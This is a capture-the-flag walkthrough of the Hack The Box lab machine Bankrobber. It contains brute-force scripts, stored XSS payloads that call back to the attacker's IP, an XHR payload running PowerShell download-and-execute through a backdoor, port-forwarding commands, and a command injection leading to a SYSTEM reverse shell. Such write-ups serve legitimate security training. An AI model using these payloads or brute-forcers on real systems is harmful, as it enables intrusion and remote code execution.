---
layout: post
title: "Bankrobber: Hack The Box Walkthrough"
date: 2020-03-07 16:55:57 +0000
last_modified_at: 2020-03-07 16:55:57 +0000
category: Walkthrough
tags: ["Hack The Box", Bankrobber, retired, Windows, Insane]
comments: true
image:
  feature: bankrobber-htb-walkthrough.jpg
  credit: QuinceMedia / Pixabay
  creditlink: https://pixabay.com/illustrations/piggy-bank-money-save-finance-3625494/
---

This post documents the complete walkthrough of Bankrobber, a retired vulnerable [VM][1] created by [Cneeliz][2] and [Gioo][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Bankrobber is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.154 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-22 18:02:00 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 3306/tcp on 10.10.10.154                                  
Discovered open port 80/tcp on 10.10.10.154                                    
Discovered open port 445/tcp on 10.10.10.154                                   
Discovered open port 443/tcp on 10.10.10.154
```

Interesting list of web-oriented open ports. Let's do one better with `nmap` scanning the discovered port to establish their services.

```
# nmap -e tun0 -n -v -Pn -p80,443,445,3306 -A --reason -oN nmap.txt 10.10.10.154
...
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http?        syn-ack ttl 127
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: E-coin
443/tcp  open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
445/tcp  open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        syn-ack ttl 127 MariaDB (unauthorized)
```

Nothing really interesting stands out. Here's how the site looks like. Bitcoin, eh?

<a class="image-popup">
![df81f624.png](/assets/images/posts/bankrobber-htb-walkthrough/df81f624.png)
</a>

### Directory/File Enumeration

Let's see what we can find with SecLists and `gobuster`.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 40 -x php,txt,log -u http://10.10.10.154/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.154/
[+] Threads:        40
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,log
[+] Timeout:        10s
===============================================================
2019/09/24 02:34:03 Starting gobuster
===============================================================
/login.php (Status: 302)
/user (Status: 301)
/admin (Status: 301)
/js (Status: 301)
/logout.php (Status: 302)
/css (Status: 301)
/register.php (Status: 200)
/img (Status: 301)
/webalizer (Status: 403)
/index.php (Status: 200)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/link.php (Status: 200)
/notes.txt (Status: 200)
/licenses (Status: 403)
/server-status (Status: 403)
/con (Status: 403)
/con.php (Status: 403)
/con.txt (Status: 403)
/con.log (Status: 403)
Progress: 8536 / 17771 (48.03%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2019/09/24 02:41:33 Finished
===============================================================
```

What have we here? `notes.txt` sure looks interesting.

<a class="image-popup">
![f5112cac.png](/assets/images/posts/bankrobber-htb-walkthrough/f5112cac.png)
</a>

### PHP Page Analysis

Let's check out the two pages of interest: `login.php` and `register.php`.

#### `login.php`

```
# curl -i -d "username=admin&password=admin" http://10.10.10.154/login.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:49:55 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

#### `register.php`

```
# curl -i -d "username=admin&password=admin" http://10.10.10.154/register.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:51:16 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php?msg=User already exists.
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Notice that `register.php` provides a way to verify whether a particular user exist? Let's see what happens when we register a totally new user.

```
# curl -i -d "username=dipshit&password=dipshit" http://10.10.10.154/register.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:53:48 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Location: index.php?msg=User created.
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Interesting. There's a message to tell us that a new user was created. What happens when we log in?

```
# curl -i -d "username=dipshit&password=dipshit" http://10.10.10.154/login.php
HTTP/1.1 302 Found
Date: Tue, 24 Sep 2019 02:55:08 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
X-Powered-By: PHP/7.3.4
Set-Cookie: id=25
Set-Cookie: username=ZGlwc2hpdA%3D%3D
Set-Cookie: password=ZGlwc2hpdA%3D%3D
Location: user
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Hmm. Cookie-based authentication??!! Look at the redirection? To `/user`! Previously in our enumeration, the directory `/admin` was also present along with `/user`. If I had to guess, I would say that admin logon gets redirected to `/admin`. With that in mind, I wrote the following brute-forcer script of sorts, using `curl` as the main driver.

<div class="filename"><span>robber.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.154
USER=admin
PASS=$1

function die() {
  killall perl &>/dev/null
}

CHECK=$(curl -i \
             -s \
             -d "username=$USER&password=$PASS" \
             http://$HOST/login.php \
  | grep -E '^Location')

if grep 'admin' <<<"$CHECK" &>/dev/null; then
  echo "[*] Password is: $PASS"
  die
fi
```

Combined with GNU Parallel, we get a poor man version's of a multi-threaded brute-forcer. It took me a while to brute-force the passsword. The credential is (`admin:hopelessromantic`).

Let's check it out.

<a class="image-popup">
![2ed0a32c.png](/assets/images/posts/bankrobber-htb-walkthrough/2ed0a32c.png)
</a>

Awesome.

### Backdooring PHP

Long story short. The creators left a PHP backdoor that can only be executed from `localhost`.

<a class="image-popup">
![10720d21.png](/assets/images/posts/bankrobber-htb-walkthrough/10720d21.png)
</a>

Recall `notes.txt`? It says that only comments from `localhost` are not encoded. This means that we may be able to inject JavaScript into the backend and run it as `localhost`. But where to inject the JavaScript?

Earlier on, I went ahead to register a new user. In the user's page there's a feature that allows one to transfer E-coins with a custom comment to the recipient.

<a class="image-popup">
![861cf35b.png](/assets/images/posts/bankrobber-htb-walkthrough/861cf35b.png)
</a>

Here's a simple JavaScript to demonstrate the callback capabilities of the remote backend.

```
<script>var img = new Image(); img.src = "http://10.10.15.23/hacked.png";</script>
```

<a class="image-popup">
![cfc55918.png](/assets/images/posts/bankrobber-htb-walkthrough/cfc55918.png)
</a>

We already knew that admin has an ID of 1 previously. We also need to set up a SimpleHTTPServer for testing purposes. Once we hit the transfer button, we are greeted with a popup alert.

<a class="image-popup">
![45cd508f.png](/assets/images/posts/bankrobber-htb-walkthrough/45cd508f.png)
</a>

That's the signal to login to the admin page.

<a class="image-popup">
![92913034.png](/assets/images/posts/bankrobber-htb-walkthrough/92913034.png)
</a>

Once you hit accept, a HTTP GET comes knocking on our door, requesting for `hacked.png`.

<a class="image-popup">
![b25df392.png](/assets/images/posts/bankrobber-htb-walkthrough/b25df392.png)
</a>

Sweet. But first, let's take a peek at how the backdoor remote command execution (`system.js`) is implemented.

<a class="image-popup">
![896c1641.png](/assets/images/posts/bankrobber-htb-walkthrough/896c1641.png)
</a>

Well, I could use XHR to reach http://localhost/admin/backdoorchecker.php. That should work. Check it out.

```
<script>
function hello() {
  var http=new XMLHttpRequest();
  var url='http://localhost/admin/backdoorchecker.php';
  var params="cmd=dir | powershell /c iex (new-object net.webclient).downloadstring('http://10.10.15.23/nmap.txt')";
  http.open('POST',url,true);
  http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  http.send(params);
}
hello();
</script>
```

Let's minify the JavaScript while we are at it.

<a class="image-popup">
![7936b333.png](/assets/images/posts/bankrobber-htb-walkthrough/7936b333.png)
</a>

Bombs away. Moments later, see who came knocking on my door, with PowerShell no less. :wink:

<a class="image-popup">
![6ddfe67d.png](/assets/images/posts/bankrobber-htb-walkthrough/6ddfe67d.png)
</a>

## Low-Privilege Shell

With that in mind, we can probably execute some kind of reverse [shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3).

<a class="image-popup">
![d84ca684.png](/assets/images/posts/bankrobber-htb-walkthrough/d84ca684.png)
</a>

Bam! The file `user.txt` is at Cortin's desktop.

<a class="image-popup">
![f0c5e13d.png](/assets/images/posts/bankrobber-htb-walkthrough/f0c5e13d.png)
</a>

## Privilege Escalation

During enumeration of Cortin's account, I notice a weird service `bankapp`, listening at `910/tcp`. The executable path is `C:\bankv2.exe`. And since the port wasn't discovered during our port scan, it can only mean that this service is listening through `localhost` or the loopback interface.

<a class="image-popup">
![a42df46a.png](/assets/images/posts/bankrobber-htb-walkthrough/a42df46a.png)
</a>

<a class="image-popup">
![cf2c3444.png](/assets/images/posts/bankrobber-htb-walkthrough/cf2c3444.png)
</a>

With that in mind, let's transfer a copy of `plink.exe` a SSH client over. Using remote port-forwarding, we can "forward" `910/tcp` over to my attacking machine hosting the SSH service.

```
start ssh -R 910:127.0.0.1:910 -pw <password> root@10.10.15.48 -N
```

Once that's done, we should be able to connect to `910/tcp` locally on our attacking machine.

<a class="image-popup">
![bea16b92.png](/assets/images/posts/bankrobber-htb-walkthrough/bea16b92.png)
</a>

#### Breaking `bankv2.exe`

So, the program requires a 4-digit PIN to log in, eh? That should be easy. I wrote a simple brute-forcer for that.

<div class="filename"><span>pin.sh</span></div>

```bash
#!/bin/bash

HOST=127.0.0.1
PORT=910
PIN=$1

function die() {
  killall perl &>/dev/null
}

if echo $PIN | nc $HOST $PORT 2>&1 | sed -r '$!d' | grep -iv 'denied' &>/dev/null; then
  echo "[*] PIN: $PIN"
  die
fi
```

See? Easy.

<a class="image-popup">
![3ad896c0.png](/assets/images/posts/bankrobber-htb-walkthrough/3ad896c0.png)
</a>

Long story short, the program is susceptible to a command injection vulnerability, after 32 bytes of string input. Prior to that, I've already copied `nc.exe` over to `C:\users\cortin\appdata\nc.exe`, so we'll launch a reverse shell from there.

<a class="image-popup">
![966210fe.png](/assets/images/posts/bankrobber-htb-walkthrough/966210fe.png)
</a>

And a shell with `SYSTEM` privilege appears...

<a class="image-popup">
![2bffd339.png](/assets/images/posts/bankrobber-htb-walkthrough/2bffd339.png)
</a>

Getting `root.txt` is trivial with a `SYSTEM` shell.

<a class="image-popup">
![5979da90.png](/assets/images/posts/bankrobber-htb-walkthrough/5979da90.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/209
[2]: https://www.hackthebox.eu/home/users/profile/3244
[3]: https://www.hackthebox.eu/home/users/profile/623
[4]: https://www.hackthebox.eu/
